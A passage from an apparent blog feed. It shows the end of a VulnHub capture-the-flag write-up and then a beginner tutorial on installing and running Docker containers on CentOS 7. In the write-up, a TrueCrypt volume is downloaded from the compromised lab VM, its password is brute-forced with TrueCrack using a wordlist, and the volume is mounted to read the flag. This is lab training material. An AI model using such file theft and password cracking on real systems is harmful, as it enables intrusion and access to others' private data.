</span><span class='line'>[*] Downloaded 1.00 MiB of 5.00 MiB (20.0%): /tmp/dave.tc -&gt; dave.tc
</span><span class='line'>[*] Downloaded 2.00 MiB of 5.00 MiB (40.0%): /tmp/dave.tc -&gt; dave.tc
</span><span class='line'>[*] Downloaded 3.00 MiB of 5.00 MiB (60.0%): /tmp/dave.tc -&gt; dave.tc
</span><span class='line'>[*] Downloaded 4.00 MiB of 5.00 MiB (80.0%): /tmp/dave.tc -&gt; dave.tc
</span><span class='line'>[*] Downloaded 5.00 MiB of 5.00 MiB (100.0%): /tmp/dave.tc -&gt; dave.tc
</span><span class='line'>[*] download   : /tmp/dave.tc -&gt; dave.tc</span></code></pre></td></tr></table></div></figure>


<p>For cracking the file, Kali already comes with TrueCrack preinstalled:</p>

<blockquote><p>TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux
and it is optimized for Nvidia Cuda technology. It supports:</p>

<p>   PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512
and Whirlpool.
   XTS block cipher mode for hard disk encryption based on encryption algorithms: AES,
SERPENT, TWOFISH.
   File-hosted (container) and Partition/device-hosted.
   Hidden volumes and Backup headers.</p>

<p>TrueCrack is able to perform a brute-force attack based on:</p>

<p>   Dictionary: read the passwords from a file of words.
   Alphabet: generate all passwords of given length from given alphabet.</p>

<p>TrueCrack works on gpu and cpu</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>truecrack
</span><span class='line'>TrueCrack v3.0
</span><span class='line'>Website: http://code.google.com/p/truecrack
</span><span class='line'>Contact us: infotruecrack@gmail.com
</span><span class='line'>Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
</span><span class='line'>Based on TrueCrypt, freely available at http://www.truecrypt.org/
</span><span class='line'>Copyright (c) 2011 by Luca Vaccaro.
</span><span class='line'>
</span><span class='line'>Usage:
</span><span class='line'> truecrack -t &lt;truecrypt_file&gt; -k &lt;ripemd160|sha512|whirlpool&gt; -w &lt;wordlist_file&gt; [-b &lt;parallel_block&gt;]
</span><span class='line'> truecrack -t &lt;truecrypt_file&gt; -k &lt;ripemd160|sha512|whirlpool&gt; -c &lt;charset&gt; [-s &lt;minlength&gt;] -m &lt;maxlength&gt; [-b &lt;parallel_block&gt;]
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'> -h --help                        Display this information.
</span><span class='line'> -t --truecrypt &lt;truecrypt_file&gt;    Truecrypt volume file.
</span><span class='line'> -k --key &lt;ripemd160 | sha512 | whirlpool&gt;      Key derivation function (default ripemd160).
</span><span class='line'> -b --blocksize &lt;parallel_blocks&gt;       Number of parallel computations (board dependent).
</span><span class='line'> -w --wordlist &lt;wordlist_file&gt;      File of words, for Dictionary attack.
</span><span class='line'> -c --charset &lt;alphabet&gt;        Alphabet generator, for Alphabet attack.
</span><span class='line'> -s --startlength &lt;minlength&gt;       Starting length of passwords, for Alphabet attack (default 1).
</span><span class='line'> -m --maxlength &lt;maxlength&gt;     Maximum length of passwords, for Alphabet attack.
</span><span class='line'> -r --restore &lt;number&gt;          Restore the computation.
</span><span class='line'> -v --verbose                     Show computation messages.
</span><span class='line'>
</span><span class='line'>Sample:
</span><span class='line'> Dictionary mode: truecrack --truecrypt ./volume --wordlist ./dictionary.txt 
</span><span class='line'> Charset mode: truecrack --truecrypt ./volume --charset ./dictionary.txt --maxlength 10</span></code></pre></td></tr></table></div></figure>


<p>The moment of truth! It didn&rsquo;t work the first try, but then I specified the key function as SHA512:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>truecrack --truecrypt dave.tc -k sha512 --wordlist rockademy.txt 
</span><span class='line'>TrueCrack v3.0
</span><span class='line'>Website: http://code.google.com/p/truecrack
</span><span class='line'>Contact us: infotruecrack@gmail.com
</span><span class='line'>Found password:       "etonacademy"
</span><span class='line'>Password length:  "12"
</span><span class='line'>Total computations:   "10"</span></code></pre></td></tr></table></div></figure>


<p>It worked! Now all that remains is to open the volume and snoop around:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cryptsetup open --type tcrypt dave.tc hidden
</span><span class='line'>Enter passphrase: 
</span><span class='line'>mkdir -p /mnt/tcrypt
</span><span class='line'>mount /dev/mapper/hidden /mnt/tcrypt/
</span><span class='line'>root@kali:/mnt/tcrypt# ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxr-xr-x 6 root root  1024 Apr 12  2016 .
</span><span class='line'>drwxr-xr-x 6 root root  4096 May  4 16:20 ..
</span><span class='line'>drwxr-xr-x 2 root root  1024 Apr 12  2016 buller
</span><span class='line'>drwx------ 2 root root 12288 Apr 12  2016 lost+found
</span><span class='line'>drwxr-xr-x 2 root root  1024 Apr 12  2016 panama
</span><span class='line'>drwxr-xr-x 3 root root  1024 Apr 12  2016 .secret</span></code></pre></td></tr></table></div></figure>


<p>A hidden directory..with another hidden directory inside it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt/tcrypt/.secret# ls -la
</span><span class='line'>total 64
</span><span class='line'>drwxr-xr-x 3 root root  1024 Apr 12  2016 .
</span><span class='line'>drwxr-xr-x 6 root root  1024 Apr 12  2016 ..
</span><span class='line'>-rw-r--r-- 1 root root 61118 Feb 25  2016 piers.png
</span><span class='line'>drwxr-xr-x 2 root root  1024 Apr 12  2016 .top</span></code></pre></td></tr></table></div></figure>


<p>And finally, the flag!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt/tcrypt/.secret/.top# cat flag.txt 
</span><span class='line'>
</span><span class='line'>################################################################################
</span><span class='line'>#   ___ ___  _  _  ___ ___    _ _____ _   _ _      _ _____ ___ ___  _  _  ___  #
</span><span class='line'>#  / __/ _ \| \| |/ __| _ \  /_\_   _| | | | |    /_\_   _|_ _/ _ \| \| |/ __| #
</span><span class='line'># | (_| (_) | .` | (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .` |\__ \ #
</span><span class='line'>#  \___\___/|_|\_|\___|_|_\/_/ \_\_|  \___/|____/_/ \_\_| |___\___/|_|\_||___/ #
</span><span class='line'>#                                                                              #
</span><span class='line'>################################################################################
</span><span class='line'>
</span><span class='line'>Firstly, thanks for trying this VM. If you have rooted it, well done!
</span><span class='line'>
</span><span class='line'>Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
</span><span class='line'>goes to barrebas and junken for help in testing and final configuration.
</span><span class='line'>                                                                    --knightmare</span></code></pre></td></tr></table></div></figure>


<p>Nice challenge that involved adjusting a wordlist and TrueCrypt cracking! It rocked!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ You will be awarded a medal for        \
</span><span class='line'>\ disregarding safety in saving someone. /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[LFCS prep - Managing Docker containers]]></title>
    <link href="http://chousensha.github.io/blog/2018/04/22/lfcs-prep-managing-docker-containers/"/>
    <updated>2018-04-22T07:30:54-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/04/22/lfcs-prep-managing-docker-containers</id>
    <content type="html"><![CDATA[<p>In today&rsquo;s post we&rsquo;ll look at Docker containers. Containers are lightweight application virtualization platforms that are isolated, but contrary to virtual machines, they share resources with the host OS. They are faster and less resource intensive than traditional VMs.</p>

<!-- more -->


<p>I&rsquo;ve had errors with the straightforward approach of installing Docker on CentOS7. So I installed by following the steps mentioned in the <a href="https://docs.docker.com/install/linux/docker-ce/centos/#set-up-the-repository">article about getting Docker Community Edition on CentOS</a></p>

<p>Install needed packages:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install -y yum-utils \
</span><span class='line'>  device-mapper-persistent-data \
</span><span class='line'>  lvm2</span></code></pre></td></tr></table></div></figure>


<p>Set up the stable Docker repository:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum-config-manager \
</span><span class='line'>    --add-repo \
</span><span class='line'>    https://download.docker.com/linux/centos/docker-ce.repo</span></code></pre></td></tr></table></div></figure>


<p>Install Docker CE:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>yum install docker-ce</span></code></pre></td></tr></table></div></figure>


<p>If you get errors, look in the journal log and troubleshoot from there, but this approach solved the problems for me:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>journalctl -u docker.service</span></code></pre></td></tr></table></div></figure>


<p>Start the Docker service:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>systemctl start docker</span></code></pre></td></tr></table></div></figure>


<p>Check information about your Docker installation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker info
</span><span class='line'>Containers: 0
</span><span class='line'> Running: 0
</span><span class='line'> Paused: 0
</span><span class='line'> Stopped: 0
</span><span class='line'>Images: 0
</span><span class='line'>Server Version: 18.03.0-ce
</span><span class='line'>Storage Driver: overlay2
</span><span class='line'> Backing Filesystem: extfs
</span><span class='line'> Supports d_type: true
</span><span class='line'> Native Overlay Diff: true
</span><span class='line'>Logging Driver: json-file
</span><span class='line'>Cgroup Driver: cgroupfs
</span><span class='line'>Plugins:
</span><span class='line'> Volume: local
</span><span class='line'> Network: bridge host macvlan null overlay
</span><span class='line'> Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog
</span><span class='line'>Swarm: inactive
</span><span class='line'>Runtimes: runc
</span><span class='line'>Default Runtime: runc
</span><span class='line'>Init Binary: docker-init
</span><span class='line'>containerd version: cfd04396dc68220d1cecbe686a6cc3aa5ce3667c
</span><span class='line'>runc version: 4fc53a81fb7c994640722ac585fa9ca548971871
</span><span class='line'>init version: 949e6fa
</span><span class='line'>Security Options:
</span><span class='line'> seccomp
</span><span class='line'>  Profile: default
</span><span class='line'>Kernel Version: 3.10.0-693.17.1.el7.x86_64
</span><span class='line'>Operating System: CentOS Linux 7 (Core)
</span><span class='line'>OSType: linux
</span><span class='line'>Architecture: x86_64
</span><span class='line'>CPUs: 4
</span><span class='line'>Total Memory: 1.687GiB
</span><span class='line'>Name: CentOS7
</span><span class='line'>ID: JRI7:OB26:2HEE:2K4Y:OCOZ:I376:F27U:22C4:L3BU:VPYQ:XZO3:FPEW
</span><span class='line'>Docker Root Dir: /var/lib/docker
</span><span class='line'>Debug Mode (client): false
</span><span class='line'>Debug Mode (server): false
</span><span class='line'>Registry: https://index.docker.io/v1/
</span><span class='line'>Labels:
</span><span class='line'>Experimental: false
</span><span class='line'>Insecure Registries:
</span><span class='line'> 127.0.0.0/8
</span><span class='line'>Live Restore Enabled: false</span></code></pre></td></tr></table></div></figure>


<p>Get more details about the version:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker version
</span><span class='line'>Client:
</span><span class='line'> Version: 18.03.0-ce
</span><span class='line'> API version: 1.37
</span><span class='line'> Go version:  go1.9.4
</span><span class='line'> Git commit:  0520e24
</span><span class='line'> Built:   Wed Mar 21 23:09:15 2018
</span><span class='line'> OS/Arch: linux/amd64
</span><span class='line'> Experimental:    false
</span><span class='line'> Orchestrator:    swarm
</span><span class='line'>
</span><span class='line'>Server:
</span><span class='line'> Engine:
</span><span class='line'>  Version:    18.03.0-ce
</span><span class='line'>  API version:    1.37 (minimum version 1.12)
</span><span class='line'>  Go version: go1.9.4
</span><span class='line'>  Git commit: 0520e24
</span><span class='line'>  Built:  Wed Mar 21 23:13:03 2018
</span><span class='line'>  OS/Arch:    linux/amd64
</span><span class='line'>  Experimental:   false</span></code></pre></td></tr></table></div></figure>


<p>The docker CLI has a lot of commands:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker --help
</span><span class='line'>
</span><span class='line'>Usage:    docker COMMAND
</span><span class='line'>
</span><span class='line'>A self-sufficient runtime for containers
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>      --config string      Location of client config files (default "/root/.docker")
</span><span class='line'>  -D, --debug              Enable debug mode
</span><span class='line'>  -H, --host list          Daemon socket(s) to connect to
</span><span class='line'>  -l, --log-level string   Set the logging level ("debug"|"info"|"warn"|"error"|"fatal") (default "info")
</span><span class='line'>      --tls                Use TLS; implied by --tlsverify
</span><span class='line'>      --tlscacert string   Trust certs signed only by this CA (default "/root/.docker/ca.pem")
</span><span class='line'>      --tlscert string     Path to TLS certificate file (default "/root/.docker/cert.pem")
</span><span class='line'>      --tlskey string      Path to TLS key file (default "/root/.docker/key.pem")
</span><span class='line'>      --tlsverify          Use TLS and verify the remote
</span><span class='line'>  -v, --version            Print version information and quit
</span><span class='line'>
</span><span class='line'>Management Commands:
</span><span class='line'>  config      Manage Docker configs
</span><span class='line'>  container   Manage containers
</span><span class='line'>  image       Manage images
</span><span class='line'>  network     Manage networks
</span><span class='line'>  node        Manage Swarm nodes
</span><span class='line'>  plugin      Manage plugins
</span><span class='line'>  secret      Manage Docker secrets
</span><span class='line'>  service     Manage services
</span><span class='line'>  swarm       Manage Swarm
</span><span class='line'>  system      Manage Docker
</span><span class='line'>  trust       Manage trust on Docker images
</span><span class='line'>  volume      Manage volumes
</span><span class='line'>
</span><span class='line'>Commands:
</span><span class='line'>  attach      Attach local standard input, output, and error streams to a running container
</span><span class='line'>  build       Build an image from a Dockerfile
</span><span class='line'>  commit      Create a new image from a container's changes
</span><span class='line'>  cp          Copy files/folders between a container and the local filesystem
</span><span class='line'>  create      Create a new container
</span><span class='line'>  diff        Inspect changes to files or directories on a container's filesystem
</span><span class='line'>  events      Get real time events from the server
</span><span class='line'>  exec        Run a command in a running container
</span><span class='line'>  export      Export a container's filesystem as a tar archive
</span><span class='line'>  history     Show the history of an image
</span><span class='line'>  images      List images
</span><span class='line'>  import      Import the contents from a tarball to create a filesystem image
</span><span class='line'>  info        Display system-wide information
</span><span class='line'>  inspect     Return low-level information on Docker objects
</span><span class='line'>  kill        Kill one or more running containers
</span><span class='line'>  load        Load an image from a tar archive or STDIN
</span><span class='line'>  login       Log in to a Docker registry
</span><span class='line'>  logout      Log out from a Docker registry
</span><span class='line'>  logs        Fetch the logs of a container
</span><span class='line'>  pause       Pause all processes within one or more containers
</span><span class='line'>  port        List port mappings or a specific mapping for the container
</span><span class='line'>  ps          List containers
</span><span class='line'>  pull        Pull an image or a repository from a registry
</span><span class='line'>  push        Push an image or a repository to a registry
</span><span class='line'>  rename      Rename a container
</span><span class='line'>  restart     Restart one or more containers
</span><span class='line'>  rm          Remove one or more containers
</span><span class='line'>  rmi         Remove one or more images
</span><span class='line'>  run         Run a command in a new container
</span><span class='line'>  save        Save one or more images to a tar archive (streamed to STDOUT by default)
</span><span class='line'>  search      Search the Docker Hub for images
</span><span class='line'>  start       Start one or more stopped containers
</span><span class='line'>  stats       Display a live stream of container(s) resource usage statistics
</span><span class='line'>  stop        Stop one or more running containers
</span><span class='line'>  tag         Create a tag TARGET_IMAGE that refers to SOURCE_IMAGE
</span><span class='line'>  top         Display the running processes of a container
</span><span class='line'>  unpause     Unpause all processes within one or more containers
</span><span class='line'>  update      Update configuration of one or more containers
</span><span class='line'>  version     Show the Docker version information
</span><span class='line'>  wait        Block until one or more containers stop, then print their exit codes
</span><span class='line'>
</span><span class='line'>Run 'docker COMMAND --help' for more information on a command.</span></code></pre></td></tr></table></div></figure>


<p>There are tons of containers available at <a href="https://hub.docker.com/explore/">https://hub.docker.com/explore/</a> . Here, let&rsquo;s look for a hello world one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker search hello
</span><span class='line'>NAME                                       DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED
</span><span class='line'>hello-world                                Hello World! (an example of minimal Dockeriz…   495                 [OK]</span></code></pre></td></tr></table></div></figure>


<p>Pull the image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker pull hello-world
</span><span class='line'>Using default tag: latest
</span><span class='line'>latest: Pulling from library/hello-world
</span><span class='line'>9bb5a5d4561a: Pull complete
</span><span class='line'>Digest: sha256:f5233545e43561214ca4891fd1157e1c3c563316ed8e237750d59bde73361e77
</span><span class='line'>Status: Downloaded newer image for hello-world:latest</span></code></pre></td></tr></table></div></figure>


<p>Run the demo image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker run hello-world
</span><span class='line'>
</span><span class='line'>Hello from Docker!
</span><span class='line'>This message shows that your installation appears to be working correctly.
</span><span class='line'>
</span><span class='line'>To generate this message, Docker took the following steps:
</span><span class='line'> 1. The Docker client contacted the Docker daemon.
</span><span class='line'> 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
</span><span class='line'>    (amd64)
</span><span class='line'> 3. The Docker daemon created a new container from that image which runs the
</span><span class='line'>    executable that produces the output you are currently reading.
</span><span class='line'> 4. The Docker daemon streamed that output to the Docker client, which sent it
</span><span class='line'>    to your terminal.
</span><span class='line'>
</span><span class='line'>To try something more ambitious, you can run an Ubuntu container with:
</span><span class='line'> $ docker run -it ubuntu bash
</span><span class='line'>
</span><span class='line'>Share images, automate workflows, and more with a free Docker ID:
</span><span class='line'> https://hub.docker.com/
</span><span class='line'>
</span><span class='line'>For more examples and ideas, visit:
</span><span class='line'> https://docs.docker.com/engine/userguide/</span></code></pre></td></tr></table></div></figure>


<p>The Docker default storage is at <code>/var/lib/docker</code>.  Now let&rsquo;s go beyond the basics and get an Ubuntu image:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker pull ubuntu
</span><span class='line'>Using default tag: latest
</span><span class='line'>latest: Pulling from library/ubuntu
</span><span class='line'>d3938036b19c: Pull complete
</span><span class='line'>a9b30c108bda: Pull complete
</span><span class='line'>67de21feec18: Pull complete
</span><span class='line'>817da545be2b: Pull complete
</span><span class='line'>d967c497ce23: Pull complete
</span><span class='line'>Digest: sha256:9ee3b83bcaa383e5e3b657f042f4034c92cdd50c03f73166c145c9ceaea9ba7c
</span><span class='line'>Status: Downloaded newer image for ubuntu:latest</span></code></pre></td></tr></table></div></figure>


<p>Check available images:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
</span><span class='line'>ubuntu              latest              c9d990395902        9 days ago          113MB
</span><span class='line'>hello-world         latest              e38bc07ac18e        10 days ago         1.85kB</span></code></pre></td></tr></table></div></figure>


<p>Run a command inside the Ubuntu container:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker run ubuntu uname -a
</span><span class='line'>Linux 05f2f247622a 3.10.0-693.17.1.el7.x86_64 #1 SMP Thu Jan 25 20:13:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>Check all containers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker ps -a
</span><span class='line'>CONTAINER ID        IMAGE               COMMAND             CREATED              STATUS                          PORTS               NAMES
</span><span class='line'>05f2f247622a        ubuntu              "uname -a"          About a minute ago   Exited (0) About a minute ago                       naughty_fermi
</span><span class='line'>db7d3fcd06a7        hello-world         "/hello"            10 minutes ago       Exited (0) 9 minutes ago                            trusting_mirzakh</span></code></pre></td></tr></table></div></figure>


<p>Take note of the container ID if you want to start a specific container:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker start 05f2f247622a
</span><span class='line'>05f2f247622a</span></code></pre></td></tr></table></div></figure>


<p>To start an interactive session in the container with an allocated TTY, do the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>docker run -it ubuntu bash
</span><span class='line'>root@c8561feac38d:/# cat /etc/issue
</span><span class='line'>Ubuntu 16.04.4 LTS \n \l</span></code></pre></td></tr></table></div></figure>


<p>Here we&rsquo;ve run the bash shell inside the container. To return to the host, type <em>exit</em></p>

<p>We&rsquo;ve only scratched the surface, but we can see how powerful and versatile Docker containers can be.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _________________________________________
